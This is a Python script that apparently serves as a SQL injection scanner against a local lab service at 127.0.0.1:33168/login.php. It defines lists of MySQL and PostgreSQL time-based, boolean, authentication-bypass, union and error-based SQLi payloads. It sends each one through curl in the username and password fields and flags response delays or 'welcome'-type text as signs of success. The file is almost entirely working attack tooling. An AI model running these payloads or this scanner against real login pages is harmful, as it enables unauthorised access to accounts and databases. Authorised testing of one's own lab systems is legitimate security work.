import os
import time
import urllib.parse

# Attempt to use curl as an alternative if Python socket connections are failing
import subprocess

def test_with_curl():
    """Test login endpoint using curl as fallback"""
    print("[+] Attempting connection using curl fallback...")
    
    # Test basic connectivity
    try:
        cmd = [
            "curl", "-s", "-w", "%{http_code},%{time_total}", 
            "-o", "/dev/null",
            "--max-time", "10",
            "--connect-timeout", "5",
            "http://127.0.0.1:33168/login.php"
        ]
        result = subprocess.run(cmd, capture_output=True, text=True, timeout=15)
        if result.returncode == 0 and result.stdout:
            http_code, response_time = result.stdout.strip().split(',')
            print(f"[+] Curl test successful: HTTP {http_code}, Time: {response_time}s")
            return True
    except Exception as e:
        print(f"[!] Curl test failed: {e}")
    
    return False

def perform_sqli_tests():
    """Comprehensive SQL injection testing with payload logging"""
    
    # Payload database
    tests = []
    
    # Time-based MySQL payloads (3-second delays)
    mysql_time_payloads = [
        "admin' OR SLEEP(3)-- ",
        "admin' OR IF(1=1,SLEEP(3),0)-- ",
        "admin' UNION SELECT SLEEP(3)-- ",
        "' OR IF(LENGTH(database())>0,SLEEP(3),0)--",
    ]
    
    # Time-based PostgreSQL
    postgres_time_payloads = [
        "admin' OR pg_sleep(3)-- ",
        "admin' UNION SELECT pg_sleep(3)-- ",
    ]
    
    # Boolean-based payloads
    boolean_payloads = [
        "' OR '1'='1'-- ",
        "admin'-- ",
        "' OR 1=1-- ",
        "' OR '1'='1'#",
        "' OR 1=1#",
    ]
    
    # Auth bypass payloads
    auth_bypass_payloads = [
        "' OR 1=1-- ",
        "' OR '1'='1'-- ",
        "admin'-- ",
        "' OR username='admin'-- ",
        "' OR 1=1 LIMIT 1-- ",
        "' OR 1=1-- -",
    ]
    
    # Union-based payloads
    union_payloads = [
        "' UNION SELECT 1,2-- ",
        "' UNION SELECT NULL,NULL-- ",
        "' UNION SELECT @@version,2-- ",
        "' UNION SELECT user(),database()-- ",
    ]
    
    # Error-based payloads
    error_payloads = [
        "' OR (SELECT 1 FROM (SELECT SLEEP(5))A)-- ",
        "1' AND (SELECT*FROM(SELECT+SLEEP(5))a)-- ",
        "' UNION SELECT 1/0-- ",
    ]
    
    # Build comprehensive test suite
    test_categories = {
        "mysql_time": mysql_time_payloads,
        "postgres_time": postgres_time_payloads, 
        "boolean": boolean_payloads,
        "auth_bypass": auth_bypass_payloads,
        "union": union_payloads,
        "error": error_payloads
    }
    
    results = {
        "total_tests": 0,
        "successful_tests": [],
        "time_delays": [],
        "different_responses": [],
        "errors": []
    }
    
    print("\n[=== STARTING SQL INJECTION TEST SUITE ===]")
    print(f"Target: http://127.0.0.1:33168/login.php\n")
    
    for category, payloads in test_categories.items():
        print(f"[=== {category.upper().replace('_', ' ')} ===]")
        
        for payload in payloads:
            results["total_tests"] += 1
            print(f"\nTest {results['total_tests']}: {payload[:60]}...")
            
            # Test in username field with empty password
            try:
                cmd = [
                    "curl", "-s", "-w", "@/dev/null\n%{http_code},%{time_total},%{size_download}",
                    "--max-time", "10",
                    "--connect-timeout", "5",
                    "-d", f"username={urllib.parse.quote(payload)}",
                    "-d", "password=",
                    "http://127.0.0.1:33168/login.php"
                ]
                
                start_time = time.time()
                result = subprocess.run(cmd, capture_output=True, text=True, timeout=15)
                end_time = time.time()
                
                if result.returncode == 0:
                    # Parse response
                    lines = result.stdout.strip().split('\n')
                    if len(lines) >= 2:
                        response_body = '\n'.join(lines[:-1])
                        metrics = lines[-1].split(',')
                        
                        if len(metrics) == 3:
                            http_code, response_time, size_download = metrics
                            response_time = float(response_time)
                            
                            print(f"  Username field: HTTP {http_code}, Time: {response_time:.3f}s, Size: {size_download} bytes")
                            
                            # Check for time-based SQLi
                            if response_time >= 3.0:
                                delay_info = {
                                    "payload": payload,
                                    "field": "username",
                                    "delay": response_time,
                                    "status": http_code
                                }
                                results["time_delays"].append(delay_info)
                                print(f"  [!] TIME DELAY DETECTED: {response_time:.3f}s (possible time-based SQLi)")
                            
                            # Check for auth bypass indicators
                            if "200" in http_code and any(indicator in response_body.lower() for indicator in ["welcome", "dashboard", "logged in", "success"]):
                                success_info = {
                                    "payload": payload,
                                    "field": "username",
                                    "type": "auth_bypass",
                                    "response_snippet": response_body[:200]
                                }
                                results["successful_tests"].append(success_info)
                                print(f"  [!] AUTH SUCCESS INDICATOR FOUND!")
                
            except Exception as e:
                print(f"  Error: {str(e)[:50]}")
                results["errors"].append({"payload": payload, "error": str(e)})
            
            # Test in password field with empty username
            try:
                cmd = [
                    "curl", "-s", "-w", "@/dev/null\n%{http_code},%{time_total},%{size_download}",
                    "--max-time", "10",
                    "--connect-timeout", "5",
                    "-d", "username=",
                    "-d", f"password={urllib.parse.quote(payload)}",
                    "http://127.0.0.1:33168/login.php"
                ]
                
                result = subprocess.run(cmd, capture_output=True, text=True, timeout=15)
                
                if result.returncode == 0:
                    lines = result.stdout.strip().split('\n')
                    if len(lines) >= 2:
                        response_body = '\n'.join(lines[:-1])
                        metrics = lines[-1].split(',')
                        
                        if len(metrics) == 3:
                            http_code, response_time, size_download = metrics
                            response_time = float(response_time)
                            
                            print(f"  Password field: HTTP {http_code}, Time: {response_time:.3f}s")
                            
                            if response_time >= 3.0:
                                delay_info = {
                                    "payload": payload,
                                    "field": "password",
                                    "delay": response_time,
                                    "status": http_code
                                }
                                results["time_delays"].append(delay_info)
                                print(f"  [!] TIME DELAY DETECTED: {response_time:.3f}s")
            
            except Exception as e:
                print(f"  Error: {str(e)[:50]}")
            
            time.sleep(0.2)  # Small delay between tests
    
    return results

# Execute tests
if not test_with_curl():
    print("[!] Cannot establish basic connectivity to the target")
    print("[!] Service may not be running on 127.0.0.1:33168")
else:
    print("\n[+] Basic connectivity confirmed, starting SQLi tests...")
